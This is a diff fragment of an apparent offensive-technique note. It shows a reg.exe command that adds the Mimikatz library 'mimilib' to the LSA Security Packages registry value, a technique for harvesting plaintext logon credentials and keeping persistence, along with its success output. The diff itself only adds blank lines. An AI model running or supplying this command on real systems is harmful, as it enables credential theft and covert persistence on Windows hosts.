@@ -27,3 +27,5 @@ reg.exe add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" 
 C:\Windows\system32>reg.exe add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ /F
 The operation completed successfully.
 ```
+
+
